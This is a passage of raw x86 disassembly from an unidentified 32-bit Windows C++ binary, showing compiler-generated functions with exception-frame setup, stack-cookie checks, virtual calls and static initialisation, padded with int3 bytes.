  4045fd:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404604:	8b c6                	mov    %esi,%eax
  404606:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404609:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404610:	59                   	pop    %ecx
  404611:	5e                   	pop    %esi
  404612:	8b e5                	mov    %ebp,%esp
  404614:	5d                   	pop    %ebp
  404615:	c3                   	ret
  404616:	cc                   	int3
  404617:	cc                   	int3
  404618:	cc                   	int3
  404619:	cc                   	int3
  40461a:	cc                   	int3
  40461b:	cc                   	int3
  40461c:	cc                   	int3
  40461d:	cc                   	int3
  40461e:	cc                   	int3
  40461f:	cc                   	int3
  404620:	e9 3b fe ff ff       	jmp    0x404460
  404625:	cc                   	int3
  404626:	cc                   	int3
  404627:	cc                   	int3
  404628:	cc                   	int3
  404629:	cc                   	int3
  40462a:	cc                   	int3
  40462b:	cc                   	int3
  40462c:	cc                   	int3
  40462d:	cc                   	int3
  40462e:	cc                   	int3
  40462f:	cc                   	int3
  404630:	55                   	push   %ebp
  404631:	8b ec                	mov    %esp,%ebp
  404633:	53                   	push   %ebx
  404634:	56                   	push   %esi
  404635:	57                   	push   %edi
  404636:	8b d9                	mov    %ecx,%ebx
  404638:	e8 23 fe ff ff       	call   0x404460
  40463d:	8b 7d 08             	mov    0x8(%ebp),%edi
  404640:	8b f0                	mov    %eax,%esi
  404642:	8b cf                	mov    %edi,%ecx
  404644:	8b 17                	mov    (%edi),%edx
  404646:	ff 52 14             	call   *0x14(%edx)
  404649:	3b f0                	cmp    %eax,%esi
  40464b:	74 2d                	je     0x40467a
  40464d:	8b 48 0c             	mov    0xc(%eax),%ecx
  404650:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  404653:	75 1c                	jne    0x404671
  404655:	8b 4e 08             	mov    0x8(%esi),%ecx
  404658:	39 48 08             	cmp    %ecx,0x8(%eax)
  40465b:	75 14                	jne    0x404671
  40465d:	51                   	push   %ecx
  40465e:	ff 76 04             	push   0x4(%esi)
  404661:	ff 70 04             	push   0x4(%eax)
  404664:	ff 15 c4 54 43 00    	call   *0x4354c4
  40466a:	83 c4 0c             	add    $0xc,%esp
  40466d:	85 c0                	test   %eax,%eax
  40466f:	74 09                	je     0x40467a
  404671:	5f                   	pop    %edi
  404672:	5e                   	pop    %esi
  404673:	33 c0                	xor    %eax,%eax
  404675:	5b                   	pop    %ebx
  404676:	5d                   	pop    %ebp
  404677:	c2 04 00             	ret    $0x4
  40467a:	57                   	push   %edi
  40467b:	8b cb                	mov    %ebx,%ecx
  40467d:	e8 ee f7 ff ff       	call   0x403e70
  404682:	5f                   	pop    %edi
  404683:	5e                   	pop    %esi
  404684:	5b                   	pop    %ebx
  404685:	5d                   	pop    %ebp
  404686:	c2 04 00             	ret    $0x4
  404689:	cc                   	int3
  40468a:	cc                   	int3
  40468b:	cc                   	int3
  40468c:	cc                   	int3
  40468d:	cc                   	int3
  40468e:	cc                   	int3
  40468f:	cc                   	int3
  404690:	55                   	push   %ebp
  404691:	8b ec                	mov    %esp,%ebp
  404693:	6a ff                	push   $0xffffffff
  404695:	68 3d f7 42 00       	push   $0x42f73d
  40469a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4046a0:	50                   	push   %eax
  4046a1:	51                   	push   %ecx
  4046a2:	56                   	push   %esi
  4046a3:	57                   	push   %edi
  4046a4:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4046a9:	33 c5                	xor    %ebp,%eax
  4046ab:	50                   	push   %eax
  4046ac:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4046af:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4046b5:	8b f9                	mov    %ecx,%edi
  4046b7:	81 3d c8 69 44 00 54 	cmpl   $0x154,0x4469c8
  4046be:	01 00 00 
  4046c1:	7c 2c                	jl     0x4046ef
  4046c3:	68 cc 69 44 00       	push   $0x4469cc
  4046c8:	e8 33 96 01 00       	call   0x41dd00
  4046cd:	8b 35 c4 69 44 00    	mov    0x4469c4,%esi
  4046d3:	83 c4 04             	add    $0x4,%esp
  4046d6:	85 f6                	test   %esi,%esi
  4046d8:	74 07                	je     0x4046e1
  4046da:	8b 06                	mov    (%esi),%eax
  4046dc:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  4046e1:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  4046e8:	00 00 00 
  4046eb:	85 f6                	test   %esi,%esi
  4046ed:	75 22                	jne    0x404711
  4046ef:	68 54 01 00 00       	push   $0x154
  4046f4:	6a 00                	push   $0x0
  4046f6:	ff 15 d8 51 43 00    	call   *0x4351d8
  4046fc:	50                   	push   %eax
  4046fd:	ff 15 e8 51 43 00    	call   *0x4351e8
  404703:	8b f0                	mov    %eax,%esi
  404705:	85 f6                	test   %esi,%esi
  404707:	75 08                	jne    0x404711
  404709:	6a ff                	push   $0xffffffff
  40470b:	ff 15 4c 54 43 00    	call   *0x43544c
  404711:	89 75 f0             	mov    %esi,-0x10(%ebp)
  404714:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40471b:	8b ce                	mov    %esi,%ecx
  40471d:	e8 0e f8 ff ff       	call   0x403f30
  404722:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  404726:	c7 06 a4 62 43 00    	movl   $0x4362a4,(%esi)
  40472c:	c7 86 4c 01 00 00 00 	movl   $0x0,0x14c(%esi)
  404733:	00 00 00 
  404736:	c7 86 50 01 00 00 00 	movl   $0x0,0x150(%esi)
  40473d:	00 00 00 
  404740:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  404744:	8b ce                	mov    %esi,%ecx
  404746:	57                   	push   %edi
  404747:	c7 06 a4 62 43 00    	movl   $0x4362a4,(%esi)
  40474d:	e8 ae f6 ff ff       	call   0x403e00
  404752:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404759:	8b c6                	mov    %esi,%eax
  40475b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40475e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404765:	59                   	pop    %ecx
  404766:	5f                   	pop    %edi
  404767:	5e                   	pop    %esi
  404768:	8b e5                	mov    %ebp,%esp
  40476a:	5d                   	pop    %ebp
  40476b:	c3                   	ret
  40476c:	cc                   	int3
  40476d:	cc                   	int3
  40476e:	cc                   	int3
  40476f:	cc                   	int3
  404770:	55                   	push   %ebp
  404771:	8b ec                	mov    %esp,%ebp
  404773:	53                   	push   %ebx
  404774:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404777:	56                   	push   %esi
  404778:	57                   	push   %edi
  404779:	8b f9                	mov    %ecx,%edi
  40477b:	8b 33                	mov    (%ebx),%esi
  40477d:	e8 de fc ff ff       	call   0x404460
  404782:	50                   	push   %eax
  404783:	8b cb                	mov    %ebx,%ecx
  404785:	ff 56 34             	call   *0x34(%esi)
  404788:	85 c0                	test   %eax,%eax
  40478a:	74 1b                	je     0x4047a7
  40478c:	8b 07                	mov    (%edi),%eax
  40478e:	8b cf                	mov    %edi,%ecx
  404790:	ff 50 44             	call   *0x44(%eax)
  404793:	53                   	push   %ebx
  404794:	8b cf                	mov    %edi,%ecx
  404796:	e8 65 f6 ff ff       	call   0x403e00
  40479b:	5f                   	pop    %edi
  40479c:	5e                   	pop    %esi
  40479d:	b8 01 00 00 00       	mov    $0x1,%eax
  4047a2:	5b                   	pop    %ebx
  4047a3:	5d                   	pop    %ebp
  4047a4:	c2 04 00             	ret    $0x4
  4047a7:	5f                   	pop    %edi
  4047a8:	5e                   	pop    %esi
  4047a9:	33 c0                	xor    %eax,%eax
  4047ab:	5b                   	pop    %ebx
  4047ac:	5d                   	pop    %ebp
  4047ad:	c2 04 00             	ret    $0x4
  4047b0:	55                   	push   %ebp
  4047b1:	8b ec                	mov    %esp,%ebp
  4047b3:	6a ff                	push   $0xffffffff
  4047b5:	68 86 f7 42 00       	push   $0x42f786
  4047ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4047c0:	50                   	push   %eax
  4047c1:	81 ec 54 01 00 00    	sub    $0x154,%esp
  4047c7:	56                   	push   %esi
  4047c8:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4047cd:	33 c5                	xor    %ebp,%eax
  4047cf:	50                   	push   %eax
  4047d0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4047d3:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4047d9:	8b f1                	mov    %ecx,%esi
  4047db:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  4047e1:	e8 4a f7 ff ff       	call   0x403f30
  4047e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4047ed:	c7 85 a0 fe ff ff a4 	movl   $0x4362a4,-0x160(%ebp)
  4047f4:	62 43 00 
  4047f7:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4047fe:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404805:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40480c:	8b ce                	mov    %esi,%ecx
  40480e:	8b 06                	mov    (%esi),%eax
  404810:	ff 50 44             	call   *0x44(%eax)
  404813:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  404819:	8b ce                	mov    %esi,%ecx
  40481b:	50                   	push   %eax
  40481c:	e8 df f5 ff ff       	call   0x403e00
  404821:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404828:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  40482e:	e8 3d fa ff ff       	call   0x404270
  404833:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404836:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40483d:	59                   	pop    %ecx
  40483e:	5e                   	pop    %esi
  40483f:	8b e5                	mov    %ebp,%esp
  404841:	5d                   	pop    %ebp
  404842:	c3                   	ret
  404843:	cc                   	int3
  404844:	cc                   	int3
  404845:	cc                   	int3
  404846:	cc                   	int3
  404847:	cc                   	int3
  404848:	cc                   	int3
  404849:	cc                   	int3
  40484a:	cc                   	int3
  40484b:	cc                   	int3
  40484c:	cc                   	int3
  40484d:	cc                   	int3
  40484e:	cc                   	int3
  40484f:	cc                   	int3
  404850:	55                   	push   %ebp
  404851:	8b ec                	mov    %esp,%ebp
  404853:	6a ff                	push   $0xffffffff
  404855:	68 bd f7 42 00       	push   $0x42f7bd
  40485a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404860:	50                   	push   %eax
  404861:	51                   	push   %ecx
  404862:	a1 0c 40 44 00       	mov    0x44400c,%eax
  404867:	33 c5                	xor    %ebp,%eax
  404869:	50                   	push   %eax
  40486a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40486d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404873:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404876:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40487d:	e8 ee f9 ff ff       	call   0x404270
  404882:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404885:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40488c:	59                   	pop    %ecx
  40488d:	8b e5                	mov    %ebp,%esp
  40488f:	5d                   	pop    %ebp
  404890:	c3                   	ret
  404891:	cc                   	int3
  404892:	cc                   	int3
  404893:	cc                   	int3
  404894:	cc                   	int3
  404895:	cc                   	int3
  404896:	cc                   	int3
  404897:	cc                   	int3
  404898:	cc                   	int3
  404899:	cc                   	int3
  40489a:	cc                   	int3
  40489b:	cc                   	int3
  40489c:	cc                   	int3
  40489d:	cc                   	int3
  40489e:	cc                   	int3
  40489f:	cc                   	int3
  4048a0:	55                   	push   %ebp
  4048a1:	8b ec                	mov    %esp,%ebp
  4048a3:	6a ff                	push   $0xffffffff
  4048a5:	68 ed f7 42 00       	push   $0x42f7ed
  4048aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4048b0:	50                   	push   %eax
  4048b1:	51                   	push   %ecx
  4048b2:	56                   	push   %esi
  4048b3:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4048b8:	33 c5                	xor    %ebp,%eax
  4048ba:	50                   	push   %eax
  4048bb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4048be:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4048c4:	8b f1                	mov    %ecx,%esi
  4048c6:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4048c9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4048d0:	e8 9b f9 ff ff       	call   0x404270
  4048d5:	8b 45 08             	mov    0x8(%ebp),%eax
  4048d8:	a8 01                	test   $0x1,%al
  4048da:	74 2d                	je     0x404909
  4048dc:	a8 04                	test   $0x4,%al
  4048de:	75 1b                	jne    0x4048fb
  4048e0:	8b ce                	mov    %esi,%ecx
  4048e2:	e8 69 6c 01 00       	call   0x41b550
  4048e7:	8b c6                	mov    %esi,%eax
  4048e9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4048ec:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4048f3:	59                   	pop    %ecx
  4048f4:	5e                   	pop    %esi
  4048f5:	8b e5                	mov    %ebp,%esp
  4048f7:	5d                   	pop    %ebp
  4048f8:	c2 04 00             	ret    $0x4
  4048fb:	68 54 01 00 00       	push   $0x154
  404900:	56                   	push   %esi
  404901:	e8 7a cd ff ff       	call   0x401680
  404906:	83 c4 08             	add    $0x8,%esp
  404909:	8b c6                	mov    %esi,%eax
  40490b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40490e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404915:	59                   	pop    %ecx
  404916:	5e                   	pop    %esi
  404917:	8b e5                	mov    %ebp,%esp
  404919:	5d                   	pop    %ebp
  40491a:	c2 04 00             	ret    $0x4
  40491d:	cc                   	int3
  40491e:	cc                   	int3
  40491f:	cc                   	int3
  404920:	55                   	push   %ebp
  404921:	8b ec                	mov    %esp,%ebp
  404923:	6a ff                	push   $0xffffffff
  404925:	68 21 f8 42 00       	push   $0x42f821
  40492a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404930:	50                   	push   %eax
  404931:	a1 0c 40 44 00       	mov    0x44400c,%eax
  404936:	33 c5                	xor    %ebp,%eax
  404938:	50                   	push   %eax
  404939:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40493c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404942:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  404948:	8b 08                	mov    (%eax),%ecx
  40494a:	a1 78 66 44 00       	mov    0x446678,%eax
  40494f:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  404955:	7f 14                	jg     0x40496b
  404957:	b8 68 66 44 00       	mov    $0x446668,%eax
  40495c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40495f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404966:	59                   	pop    %ecx
  404967:	8b e5                	mov    %ebp,%esp
  404969:	5d                   	pop    %ebp
  40496a:	c3                   	ret
  40496b:	68 78 66 44 00       	push   $0x446678
  404970:	e8 7f 92 02 00       	call   0x42dbf4
  404975:	83 c4 04             	add    $0x4,%esp
  404978:	83 3d 78 66 44 00 ff 	cmpl   $0xffffffff,0x446678
  40497f:	75 d6                	jne    0x404957
  404981:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404988:	b9 6c 66 44 00       	mov    $0x44666c,%ecx
  40498d:	68 d4 5f 43 00       	push   $0x435fd4
  404992:	c7 05 68 66 44 00 40 	movl   $0x404a40,0x446668
  404999:	4a 40 00 
  40499c:	e8 8f e2 ff ff       	call   0x402c30
  4049a1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4049a8:	68 78 66 44 00       	push   $0x446678
  4049ad:	e8 f8 91 02 00       	call   0x42dbaa
  4049b2:	83 c4 04             	add    $0x4,%esp
  4049b5:	eb a0                	jmp    0x404957
  4049b7:	cc                   	int3
  4049b8:	cc                   	int3
  4049b9:	cc                   	int3
  4049ba:	cc                   	int3
  4049bb:	cc                   	int3
  4049bc:	cc                   	int3
  4049bd:	cc                   	int3
  4049be:	cc                   	int3
  4049bf:	cc                   	int3
  4049c0:	55                   	push   %ebp
  4049c1:	8b ec                	mov    %esp,%ebp
  4049c3:	53                   	push   %ebx
  4049c4:	56                   	push   %esi
  4049c5:	8b d9                	mov    %ecx,%ebx
  4049c7:	e8 54 ff ff ff       	call   0x404920
  4049cc:	8b 75 08             	mov    0x8(%ebp),%esi
  4049cf:	3b f0                	cmp    %eax,%esi
  4049d1:	74 5f                	je     0x404a32
  4049d3:	8b 48 0c             	mov    0xc(%eax),%ecx
  4049d6:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  4049d9:	75 1c                	jne    0x4049f7
  4049db:	8b 4e 08             	mov    0x8(%esi),%ecx
  4049de:	39 48 08             	cmp    %ecx,0x8(%eax)
  4049e1:	75 14                	jne    0x4049f7
  4049e3:	51                   	push   %ecx
  4049e4:	ff 76 04             	push   0x4(%esi)
  4049e7:	ff 70 04             	push   0x4(%eax)
  4049ea:	ff 15 c4 54 43 00    	call   *0x4354c4
  4049f0:	83 c4 0c             	add    $0xc,%esp
  4049f3:	85 c0                	test   %eax,%eax
  4049f5:	74 3b                	je     0x404a32
  4049f7:	e8 64 fa ff ff       	call   0x404460
  4049fc:	3b f0                	cmp    %eax,%esi
  4049fe:	74 32                	je     0x404a32
  404a00:	8b 48 0c             	mov    0xc(%eax),%ecx
  404a03:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  404a06:	75 1c                	jne    0x404a24
  404a08:	8b 4e 08             	mov    0x8(%esi),%ecx
  404a0b:	39 48 08             	cmp    %ecx,0x8(%eax)
  404a0e:	75 14                	jne    0x404a24
